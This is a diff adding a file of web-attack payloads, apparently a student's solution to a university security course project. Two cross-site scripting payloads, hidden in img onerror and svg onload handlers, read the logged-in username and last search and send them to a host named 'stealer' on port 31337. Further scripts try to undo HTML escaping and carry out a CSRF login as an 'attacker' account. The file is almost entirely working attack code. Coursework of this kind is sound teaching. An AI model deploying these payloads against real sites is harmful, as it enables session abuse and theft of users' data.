@@ -1,0 +1,37 @@
+
+<img src=0 onerror="$(document).ready(function() {
+    let last_searched = $(&quot;.history-item,.list-group-item&quot;)[1].innerText;
+    let user = $(&quot;#logged-in-user&quot;)[0].innerText;
+    let url = `http://stealer:31337/?stolen_user=${user}&last_search=${last_searched}`;
+    fetch(url);
+    alert(url);
+});" />
+
+<svg onload="$(document).ready(function() {
+    let last_searched = $(&quot;.history-item,.list-group-item&quot;)[1].innerText;
+    let user = $(&quot;#logged-in-user&quot;)[0].innerText;
+    let url = `http://stealer:31337/?stolen_user=${user}&last_search=${last_searched}`;
+    fetch(url);
+    alert(url);
+});"></svg>
+
+<script>
+    $(document).ready(function() {
+        $("#query-lbl")[0].innerHTML = $("#query-lbl")[0].innerHTML.replaceAll('&lt;', charCodeAt(60));
+    });
+        
+    </script>
+
+
+<script>
+    var url = "https://project2.eecs388.org/login?csrfdefense=0";
+    $.ajax({
+        type: "POST",
+        url: url,
+        xhrFields: {withCredentials: true},
+        data: {
+            username: "attacker",
+            password: "l33th4x",
+        },
+    });
+</script>
